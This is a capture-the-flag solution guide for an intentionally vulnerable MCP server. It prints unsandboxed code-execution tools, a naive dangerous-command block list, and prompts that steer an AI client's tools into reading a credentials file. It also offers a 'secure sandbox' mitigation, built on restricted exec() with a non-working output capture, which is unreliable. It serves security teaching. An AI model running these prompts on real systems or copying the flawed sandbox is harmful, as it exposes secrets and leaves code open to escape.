# Challenge 8: Malicious Code Execution - Solution Guide

## Vulnerability

This challenge demonstrates a malicious code execution vulnerability in an MCP server. The MCP server executes code without proper validation or sandboxing, allowing attackers to run arbitrary code on the system.

## Solution

### Step 1: Reconnaissance

First, explore the server to understand what resources and tools are available:

1. Connect to the server at http://localhost:8008/mcp using an MCP client
2. Examine the available resources and tools
3. Notice that there's a resource for system information (`system://info`) and tools for executing Python code (`execute_python_code`), executing shell commands (`execute_shell_command`), and analyzing log files (`analyze_log_file`)

### Step 2: Identify the Vulnerability

The vulnerability is in multiple tools that execute code without proper validation or sandboxing:

1. The `execute_python_code` tool executes arbitrary Python code without proper sandboxing:

```python
# VULNERABILITY: This tool executes arbitrary Python code without proper sandboxing
# A secure implementation would use a restricted environment, limit imports, etc.

try:
    # Create a temporary file to write the code
    with tempfile.NamedTemporaryFile(suffix='.py', delete=False) as temp_file:
        temp_file_path = temp_file.name
        temp_file.write(code.encode())
    
    # Execute the code and capture the output
    result = subprocess.check_output([sys.executable, temp_file_path], stderr=subprocess.STDOUT)
    
    # Clean up the temporary file
    os.unlink(temp_file_path)
    
    return f"Code executed successfully:\n\n{result.decode()}"
```

2. The `execute_shell_command` tool executes arbitrary shell commands with insufficient validation:

```python
# VULNERABILITY: This tool executes arbitrary shell commands without proper validation
# A secure implementation would whitelist allowed commands or use a restricted shell

try:
    # ATTEMPT at security (but insufficient): Block some dangerous commands
    dangerous_commands = ["rm", "mkfs", "dd", "format", ">", ">>"]
    
    # Check if the command contains any dangerous commands
    if any(cmd in command for cmd in dangerous_commands):
        return "Error: Command contains potentially dangerous operations and has been blocked."
    
    # Execute the command and capture the output
    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    
    return f"Command executed successfully:\n\n{result.decode()}"
```

3. The `analyze_log_file` tool can read any file on the system:

```python
# VULNERABILITY: This tool can be used to read any file on the system
# A secure implementation would restrict access to a specific directory
```

### Step 3: Exploit the Vulnerability

There are multiple ways to exploit this vulnerability:

#### Method 1: Execute malicious Python code

Use the `execute_python_code` tool to run code that accesses sensitive information:

```
Please execute the following Python code using the execute_python_code tool:

import os

# Read the sensitive credentials file
with open('tmp/challenge8_malicious_code_execution/sensitive/credentials.txt', 'r') as f:
    credentials = f.read()

print("Sensitive credentials:")
print(credentials)
```

#### Method 2: Execute shell commands to access sensitive information

Use the `execute_shell_command` tool to run commands that access sensitive information:

```
Please execute the shell command "cat tmp/challenge8_malicious_code_execution/sensitive/credentials.txt" using the execute_shell_command tool.
```

#### Method 3: Bypass the dangerous command filter

The dangerous command filter is insufficient and can be bypassed:

```
Please execute the shell command "cat tmp/challenge8_malicious_code_execution/sensitive/credentials.txt | grep -A 10 PRODUCTION" using the execute_shell_command tool.
```

#### Method 4: Use the analyze_log_file tool

Use the `analyze_log_file` tool to read the sensitive file:

```
Please analyze the log file at "tmp/challenge8_malicious_code_execution/sensitive/credentials.txt" using the analyze_log_file tool.
```

### Step 4: Access Sensitive Information

Using any of the methods above, you can access the sensitive credentials:

```
PRODUCTION CREDENTIALS
----------------------
Database:
  Host: db.acmecorp.internal
  Username: db_admin
  Password: Pr0d-DB-S3cur3!P@$$w0rd

AWS:
  Access Key ID: AKIAIOSFODNN7EXAMPLE
  Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
  Region: us-west-2

API Gateway:
  Key: apg-prod-8a7b6c5d4e3f2g1h
  Secret: 9i8u7y6t5r4e3w2q1z0x9c8v7b6n5m4k3j2h1g
```

## Mitigation Strategies

To prevent malicious code execution vulnerabilities:

1. **Implement proper sandboxing**: Use secure sandboxing techniques to isolate code execution.

2. **Use allowlists instead of blocklists**: Define a specific set of allowed commands or operations rather than trying to block dangerous ones.

3. **Limit access to system resources**: Restrict access to file systems, network, and other system resources.

4. **Implement input validation**: Validate all inputs to ensure they meet expected formats and don't contain malicious code.

5. **Use the principle of least privilege**: Only grant the minimum permissions necessary for the intended functionality.

Example of improved code for the `execute_python_code` tool:

```python
def execute_python_code(code: str) -> str:
    """Execute Python code for data analysis."""
    try:
        # Create a secure sandbox environment
        sandbox = {
            '__builtins__': {
                'print': print,
                'len': len,
                'str': str,
                'int': int,
                'float': float,
                'bool': bool,
                'list': list,
                'dict': dict,
                'tuple': tuple,
                'range': range,
                'sum': sum,
                'min': min,
                'max': max,
                # Add other safe builtins as needed
            }
        }
        
        # Execute the code in the sandbox
        exec(code, sandbox)
        
        # Capture the output (in a real implementation, you would redirect stdout)
        # This is a simplified example
        if '_output' in sandbox:
            return f"Code executed successfully:\n\n{sandbox['_output']}"
        else:
            return "Code executed successfully (no output)"
    except Exception as e:
        return f"Error executing code: {str(e)}"
```

This improved implementation:
1. Creates a secure sandbox with only safe built-in functions
2. Doesn't allow access to dangerous modules like `os`, `sys`, `subprocess`, etc.
3. Executes the code in the sandbox rather than as a separate process
4. Provides clear error messages without leaking system information
